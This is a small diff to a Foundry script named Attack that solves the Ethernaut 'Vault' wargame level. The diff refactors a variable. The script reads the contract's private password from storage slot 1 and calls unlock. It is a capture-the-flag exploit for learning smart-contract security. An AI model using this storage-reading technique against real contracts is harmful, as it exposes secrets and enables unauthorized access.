@@ -8,7 +8,6 @@ import { Vault } from "src/Level08.sol";
 
 contract Attack is Script {
     Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
-    Vault instance;
 
     function run() public {
         uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
@@ -18,7 +17,7 @@ contract Attack is Script {
         Vm.Log[] memory entries = vm.getRecordedLogs();
         address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
         console2.log(instanceAddress);
-        instance = Vault(instanceAddress);
+        Vault instance = Vault(instanceAddress);
 
         bytes32 password = vm.load(instanceAddress, bytes32(uint256(1)));
         instance.unlock(password);
